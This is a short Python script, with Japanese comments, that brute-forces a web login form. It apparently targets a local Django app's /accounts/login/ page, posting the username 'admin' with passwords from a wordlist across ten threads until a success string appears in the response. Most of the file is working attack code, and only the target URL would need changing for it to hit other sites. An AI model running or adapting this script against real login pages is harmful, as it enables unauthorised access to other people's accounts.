from html.parser import HTMLParser
from queue import Queue

import requests
import threading
import time

SUCCESS = "トーク"
TARGET = "http://127.0.0.1:8000/accounts/login/"
WORDLIST = ""    # passwordのパスを記述


def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()

        words = Queue()
        for word in raw_words.split():
            words.put(word)
        return words


class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f"\nBrute Force Attack begining on {url}.\n")
        print("Finished the setup where username = %s\n" % username)

    def run_bruter(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):
        params = dict()
        params["username"] = self.username

        while not passwords.empty() and not self.found:
            try:
                password = passwords.get()
                print(f"Trying username/password {self.username}/{password:<10}")
                params["password"] = password
                response = requests.post(self.url, data=params)

                if SUCCESS in response.content.decode():
                    self.found = True
                    print(f"\nBruteforcing successful.")
                    print("Username is %s" % self.username)
                    print("Password is %s" % password)
            except:
                pass
            finally:
                time.sleep(1)


if __name__ == "__main__":
    b = Bruter("admin", TARGET)
    words = get_words()
    b.run_bruter(words)
